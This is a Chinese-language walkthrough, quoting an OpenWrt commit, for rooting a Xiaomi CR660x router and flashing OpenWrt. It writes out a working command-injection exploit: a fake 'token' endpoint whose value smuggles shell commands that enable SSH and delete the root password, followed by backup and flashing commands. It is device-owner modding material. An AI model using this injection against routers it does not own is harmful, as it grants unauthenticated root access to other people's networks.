# 路由器 小米 cr6606

安装 OpenWrt 方法:
<https://git.openwrt.org/?p=openwrt/openwrt.git;a=commit;h=3343ca7e6837b2ac5f237ea78bf73d50831dea20>

```
ramips: add support for Xiaomi Mi Router CR660x series
author	Raymond Wang <infiwang@pm.me>
	Sat, 11 Sep 2021 23:54:30 +0800 (23:54 +0800)
committer	Hauke Mehrtens <hauke@hauke-m.de>
	Mon, 7 Feb 2022 07:03:27 +0800 (00:03 +0100)
commit	3343ca7e6837b2ac5f237ea78bf73d50831dea20
tree	677ebc63b57d84e25fc590483a6a37902a88b3c9
parent	e0683839b8036388213d7662f3e0066a29b7d480
```

````
ramips: add support for Xiaomi Mi Router CR660x series

Xiaomi Mi Router CR6606 is a Wi-Fi6 AX1800 Router with 4 GbE Ports.
Alongside the general model, it has three carrier customized models:
CR6606 (China Unicom), CR6608 (China Mobile), CR6609 (China Telecom)

Specifications:
- SoC: MediaTek MT7621AT
- RAM: 256MB DDR3 (ESMT M15T2G16128A)
- Flash: 128MB NAND (ESMT F59L1G81MB)
- Ethernet: 1000Base-T x4 (MT7530 SoC)
- WLAN: 2x2 2.4GHz 574Mbps + 2x2 5GHz 1201Mbps (MT7905DAN + MT7975DN)
- LEDs: System (Blue, Yellow), Internet (Blue, Yellow)
- Buttons: Reset, WPS
- UART: through-hole on PCB ([VCC 3.3v](RX)(GND)(TX) 115200, 8n1)
- Power: 12VDC, 1A

Jailbreak Notes:
1. Get shell access.
   1.1. Get yourself a wireless router that runs OpenWrt already.
   1.2. On the OpenWrt router:
      1.2.1. Access its console.
      1.2.2. Create and edit
             /usr/lib/lua/luci/controller/admin/xqsystem.lua
             with the following code (exclude backquotes and line no.):
```
     1  module("luci.controller.admin.xqsystem", package.seeall)
     2
     3  function index()
     4      local page   = node("api")
     5      page.target  = firstchild()
     6      page.title   = ("")
     7      page.order   = 100
     8      page.index = true
     9      page   = node("api","xqsystem")
    10      page.target  = firstchild()
    11      page.title   = ("")
    12      page.order   = 100
    13      page.index = true
    14      entry({"api", "xqsystem", "token"}, call("getToken"), (""),
103, 0x08)
    15  end
    16
    17  local LuciHttp = require("luci.http")
    18
    19  function getToken()
    20      local result = {}
    21      result["code"] = 0
    22      result["token"] = "; nvram set ssh_en=1; nvram commit; sed -i
's/channel=.*/channel=\"debug\"/g' /etc/init.d/dropbear; /etc/init.d/drop
bear start;"
    23      LuciHttp.write_json(result)
    24  end
```
      1.2.3. Browse http://{OWRT_ADDR}/cgi-bin/luci/api/xqsystem/token
             It should give you a respond like this:
             {"code":0,"token":"; nvram set ssh_en=1; nvram commit; ..."}
             If so, continue; Otherwise, check the file, reboot the rout-
             er, try again.
      1.2.4. Set wireless network interface's IP to 169.254.31.1, turn
             off DHCP of wireless interface's zone.
      1.2.5. Connect to the router wirelessly, manually set your access
             device's IP to 169.254.31.3, make sure
             http://169.254.31.1/cgi-bin/luci/api/xqsystem/token
             still have a similar result as 1.2.3 shows.
   1.3. On the Xiaomi CR660x:
        1.3.1. Login to the web interface. Your would be directed to a
               page with URL like this:
               http://{ROUTER_ADDR}/cgi-bin/luci/;stok={STOK}/web/home#r-
               outer
        1.3.2. Browse this URL with {STOK} from 1.3.1, {WIFI_NAME}
               {PASSWORD} be your OpenWrt router's SSID and password:
               http://{MIROUTER_ADDR}/cgi-bin/luci/;stok={STOK}/api/misy-
               stem/extendwifi_connect?ssid={WIFI_NAME}&password={PASSWO-
               RD}
               It should return 0.
        1.3.3. Browse this URL with {STOK} from 1.3.1:
               http://{MIROUTER_ADDR}/cgi-bin/luci/;stok={STOK}/api/xqsy-
               stem/oneclick_get_remote_token?username=xxx&password=xxx&-
               nonce=xxx
   1.4. Before rebooting, you can now access your CR660x via SSH.
        For CR6606, you can calculate your root password by this project:
        https://github.com/wfjsw/xiaoqiang-root-password, or at
        https://www.oxygen7.cn/miwifi.
        The root password for carrier-specific models should be the admi-
        nistration password or the default login password on the label.
        It is also feasible to change the root password at the same time
        by modifying the script from step 1.2.2.
        You can treat OpenWrt Router however you like from this point as
        long as you don't mind go through this again if you have to expl-
        oit it again. If you do have to and left your OpenWrt router unt-
        ouched, start from 1.3.
2. There's no official binary firmware available, and if you lose the
   content of your flash, no one except Xiaomi can help you.
   Dump these partitions in case you need them:
   "Bootloader" "Nvram" "Bdata" "crash" "crash_log"
   "firmware" "firmware1" "overlay" "obr"
   Find the corespond block device from /proc/mtd
   Read from read-only block device to avoid misoperation.
   It's recommended to use /tmp/syslogbackup/ as destination, since files
   would be available at http://{ROUTER_ADDR}/backup/log/YOUR_DUMP
   Keep an eye on memory usage though.
3. Since UART access is locked ootb, you should get UART access by modify
   uboot env. Otherwise, your router may become bricked.
   Excute these in stock firmware shell:
    a. nvram set boot_wait=on
    b. nvram set bootdelay=3
    c. nvram commit
   Or in OpenWrt:
    a. opkg update && opkg install kmod-mtd-rw
    b. insmod mtd-rw i_want_a_brick=1
    c. fw_setenv boot_wait on
    d. fw_setenv bootdelay 3
    e. rmmod mtd-rw

Migrate to OpenWrt:
 1. Transfer squashfs-firmware.bin to the router.
 2. nvram set flag_try_sys1_failed=0
 3. nvram set flag_try_sys2_failed=1
 4. nvram commit
 5. mtd -r write /path/to/image/squashfs-firmware.bin firmware

Additional Info:
 1. CR660x series routers has a different nand layout compared to other
    Xiaomi nand devices.
 2. This router has a relatively fresh uboot (2018.09) compared to other
    Xiaomi devices, and it is capable of booting fit image firmware.
    Unfortunately, no successful attempt of booting OpenWrt fit image
    were made so far. The cause is still yet to be known. For now, we use
    legacy image instead.

Signed-off-by: Raymond Wang <infiwang@pm.me>
````

## 解释

### 1 准备 A

需要一个已经安装 OpenWrt 的无线路由器 (以下称为 A)

在 A 的 `/usr/lib/lua/luci/controller/admin/xqsystem.lua` 位置放置文件
[`xqsystem.lua`](./cr6606/xqsystem.lua)

### 2 测试 A

访问 `http://{A 的 IP}/cgi-bin/luci/api/xqsystem/token`

比如 <http://192.168.5.1/cgi-bin/luci/api/xqsystem/token>

应该返回

```
{"token":"; nvram set ssh_en=1; nvram commit; sed -i 's\/channel=.*\/channel=\"debug\"\/g' \/etc\/init.d\/dropbear; \/etc\/init.d\/dropbear start;","code":0}
```

### 3 设置 A

设置 A 的无线网络接口 IP 地址为 `169.254.31.1`, 关闭 DHCP.

### 4 测试 A

通过无线连接 A, 手动设置连接的设备的 IP 地址为 `169.254.31.3`

访问 <http://169.254.31.1/cgi-bin/luci/api/xqsystem/token>

结果应该和步骤 (2) 的一样.

### 5 登录 B

登录 cr660x 路由器 (以下称为 B) 的 web 管理界面, 从 URL 获取 STOK

### 6 操作 B

6.1 访问
`http://{B 的 IP}/cgi-bin/luci/;stok={STOK}/api/misystem/extendwifi_connect?ssid={WIFI_NAME}&password={PASSWORD}`

其中 `{WIFI_NAME}` 是 A 的无线 SSID 名称, `{PASSWORD}` 是 A 的无线密码.

应该返回 0.

```
{"msg":"connect succces!","code":0}
```

6.2 访问
`http://{B 的 IP}/cgi-bin/luci/;stok={STOK}/api/xqsystem/oneclick_get_remote_token?username=xxx&password=xxx&nonce=xxx`

```
{"token":"; nvram set ssh_en=1; nvram commit; sed -i 's/channel=.*/channel=\u0022debug\u0022/g' /etc/init.d/dropbear; /etc/init.d/dropbear start; passwd -d root;","code":0}
```

### 7 连接 B (SSH)

在重启 B 之前, 应该能通过 SSH 连接 B 了.

```
> ssh root@192.168.31.1
Unable to negotiate with 192.168.31.1 port 22: no matching host key type found. Their offer: ssh-rsa
```

对于这个错误, 增加 SSH 参数即可:

```
> ssh -oHostKeyAlgorithms=+ssh-rsa root@192.168.31.1

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.31.1' (RSA) to the list of known hosts.


BusyBox v1.25.1 (2022-05-30 18:05:32 UTC) built-in shell (ash)

 -----------------------------------------------------
       Welcome to XiaoQiang!
 -----------------------------------------------------
  $$$$$$\  $$$$$$$\  $$$$$$$$\      $$\      $$\        $$$$$$\  $$\   $$\
 $$  __$$\ $$  __$$\ $$  _____|     $$ |     $$ |      $$  __$$\ $$ | $$  |
 $$ /  $$ |$$ |  $$ |$$ |           $$ |     $$ |      $$ /  $$ |$$ |$$  /
 $$$$$$$$ |$$$$$$$  |$$$$$\         $$ |     $$ |      $$ |  $$ |$$$$$  /
 $$  __$$ |$$  __$$< $$  __|        $$ |     $$ |      $$ |  $$ |$$  $$<
 $$ |  $$ |$$ |  $$ |$$ |           $$ |     $$ |      $$ |  $$ |$$ |\$$\
 $$ |  $$ |$$ |  $$ |$$$$$$$$\       $$$$$$$$$  |       $$$$$$  |$$ | \$$\
 \__|  \__|\__|  \__|\________|      \_________/        \______/ \__|  \__|


=== WARNING! =====================================
There is no root password defined on this device!
Use the "passwd" command to set up a new password
in order to prevent unauthorized SSH logins.
--------------------------------------------------
root@XiaoQiang:~#
```

### 8 备份原版固件

建议先备份 B 的 flash 分区内容.

建议把备份文件存储到 `/tmp/syslogbackup` 目录, 方便下载:

```
root@XiaoQiang:~# cd /tmp
root@XiaoQiang:/tmp# mkdir -p syslogbackup
root@XiaoQiang:/tmp# cd syslogbackup
root@XiaoQiang:/tmp/syslogbackup#
```

这是 flash 分区表:

```
# cat /proc/mtd
dev:    size   erasesize  name
mtd0: 00080000 00020000 "Bootloader"
mtd1: 00040000 00020000 "Nvram"
mtd2: 00040000 00020000 "Bdata"
mtd3: 00080000 00020000 "Factory"
mtd4: 00040000 00020000 "crash"
mtd5: 00040000 00020000 "crash_log"
mtd6: 01e00000 00020000 "firmware"
mtd7: 01e00000 00020000 "firmware1"
mtd8: 00340000 00020000 "kernel"
mtd9: 01ac0000 00020000 "rootfs"
mtd10: 00e00000 00020000 "rootfs_data"
mtd11: 03200000 00020000 "overlay"
mtd12: 01000000 00020000 "obr"
```

建议备份以下分区 (9): bootloader, nvram, bdata, crash, crash_log, firmware,
firmware1, overlay, obr.

```
root@XiaoQiang:/tmp/syslogbackup# dd if=/dev/mtd0 of=mtd0-bootloader.img
524288 bytes (512.0KB) copied, 0.214470 seconds, 2.3MB/s
root@XiaoQiang:/tmp/syslogbackup# dd if=/dev/mtd1 of=mtd1-nvram.img
262144 bytes (256.0KB) copied, 0.108439 seconds, 2.3MB/s
root@XiaoQiang:/tmp/syslogbackup# dd if=/dev/mtd2 of=mtd2-bdata.img
262144 bytes (256.0KB) copied, 0.107703 seconds, 2.3MB/s
root@XiaoQiang:/tmp/syslogbackup# dd if=/dev/mtd4 of=mtd4-crash.img
262144 bytes (256.0KB) copied, 0.107847 seconds, 2.3MB/s
root@XiaoQiang:/tmp/syslogbackup# dd if=/dev/mtd5 of=mtd5-crash_log.img
262144 bytes (256.0KB) copied, 0.107528 seconds, 2.3MB/s
root@XiaoQiang:/tmp/syslogbackup# dd if=/dev/mtd12 of=mtd12-obr.img
16777216 bytes (16.0MB) copied, 7.048153 seconds, 2.3MB/s
root@XiaoQiang:/tmp/syslogbackup#
```

下载备份文件:

```
> wget http://192.168.31.1/backup/log/mtd0-bootloader.img
> wget http://192.168.31.1/backup/log/mtd1-nvram.img
> wget http://192.168.31.1/backup/log/mtd2-bdata.img
> wget http://192.168.31.1/backup/log/mtd4-crash.img
> wget http://192.168.31.1/backup/log/mtd5-crash_log.img
> wget http://192.168.31.1/backup/log/mtd12-obr.img
```

为了防止内存占满, 删除已经下载的备份文件:

```
root@XiaoQiang:/tmp/syslogbackup# rm mtd12-obr.img
root@XiaoQiang:/tmp/syslogbackup# rm mtd0-bootloader.img
root@XiaoQiang:/tmp/syslogbackup# rm mtd1-nvram.img
root@XiaoQiang:/tmp/syslogbackup# rm mtd2-bdata.img
root@XiaoQiang:/tmp/syslogbackup# rm mtd4-crash.img
root@XiaoQiang:/tmp/syslogbackup# rm mtd5-crash_log.img
```

继续备份:

```
root@XiaoQiang:/tmp/syslogbackup# dd if=/dev/mtd11 of=mtd11-overlay.img
52428800 bytes (50.0MB) copied, 21.485999 seconds, 2.3MB/s
```

继续下载:

```
> wget http://192.168.31.1/backup/log/mtd11-overlay.img
```

继续备份:

```
root@XiaoQiang:/tmp/syslogbackup# rm mtd11-overlay.img
root@XiaoQiang:/tmp/syslogbackup# dd if=/dev/mtd6 of=mtd6-firmware.img
31457280 bytes (30.0MB) copied, 12.973654 seconds, 2.3MB/s
root@XiaoQiang:/tmp/syslogbackup# dd if=/dev/mtd7 of=mtd7-firmware1.img
31457280 bytes (30.0MB) copied, 12.987313 seconds, 2.3MB/s
root@XiaoQiang:/tmp/syslogbackup#
```

继续下载:

```
> wget http://192.168.31.1/backup/log/mtd6-firmware.img
> wget http://192.168.31.1/backup/log/mtd7-firmware1.img
```

这是下载的备份文件列表:

```
> ls -l
-r--r--r-- 1 s2 s2   524288 Apr 27 05:11 mtd0-bootloader.img
-r--r--r-- 1 s2 s2 52428800 Apr 27 05:20 mtd11-overlay.img
-r--r--r-- 1 s2 s2 16777216 Apr 27 05:12 mtd12-obr.img
-r--r--r-- 1 s2 s2   262144 Apr 27 05:11 mtd1-nvram.img
-r--r--r-- 1 s2 s2   262144 Apr 27 05:11 mtd2-bdata.img
-r--r--r-- 1 s2 s2   262144 Apr 27 05:11 mtd4-crash.img
-r--r--r-- 1 s2 s2   262144 Apr 27 05:12 mtd5-crash_log.img
-r--r--r-- 1 s2 s2 31457280 Apr 27 05:22 mtd6-firmware.img
-r--r--r-- 1 s2 s2 31457280 Apr 27 05:23 mtd7-firmware1.img
> sha256sum * > sha256sum.txt
> cat sha256sum.txt 
a69f4415788f1837c758e3fd3a651c86f6ea27241177f5232e6086f34eb2d35b  mtd0-bootloader.img
6cb29f942fc2444965d9aea5672bd484856484c400e86c818c938051e70f6b5b  mtd1-nvram.img
1b62c18c177c43a48df597692951de2c30428d3419d1a3b98ed9d5397e47bb4b  mtd2-bdata.img
3b874d3ba46c638fc3094f8e92fb744ca974893873f8885f54e23760f9b6311b  mtd4-crash.img
3b874d3ba46c638fc3094f8e92fb744ca974893873f8885f54e23760f9b6311b  mtd5-crash_log.img
e7fd124985d755401bccf41abdc5d607e8d6bc87b7b592230e45ee12bfde1bcd  mtd6-firmware.img
703001d8ac48b66e6ca80e49cc7933770e966bd3f02fe746775c7da150e695cf  mtd7-firmware1.img
9279b3b53afc2cb3d1376bd7b043caca584c1f267526e5a67d401beb39566c57  mtd11-overlay.img
58e4329b4a0b9015949c1f771fb49414160dc4b93c68ecc99b5d4687953f2680  mtd12-obr.img
```

### 9 启用 UART

在 B 上运行:

```sh
nvram set boot_wait=on
nvram set bootdelay=3
nvram commit
```

### 10 安装 OpenWrt

将固件文件 `squashfs-firmware.bin` 传输到 B, 然后写入:

```
root@XiaoQiang:/tmp# wget http://192.168.31.20:3000/cr6606-squashfs-firmware.bin
Connecting to 192.168.31.20:3000 (192.168.31.20:3000)
cr6606-squashfs-firm 100% |*******************************|  9216k  0:00:00 ETA
root@XiaoQiang:/tmp# ls -l cr6606-squashfs-firmware.bin 
-rw-r--r--    1 root     root       9437184 Apr 27 05:35 cr6606-squashfs-firmware.bin

root@XiaoQiang:/tmp# nvram set flag_try_sys1_failed=0
root@XiaoQiang:/tmp# nvram set flag_try_sys2_failed=1
root@XiaoQiang:/tmp# nvram commit

root@XiaoQiang:/tmp# mtd -r write /tmp/cr6606-squashfs-firmware.bin firmware
Unlocking firmware ...

Writing from /tmp/cr6606-squashfs-firmware.bin to firmware ...     
Rebooting ...
Connection to 192.168.31.1 closed by remote host.
Connection to 192.168.31.1 closed.
>
```

TODO
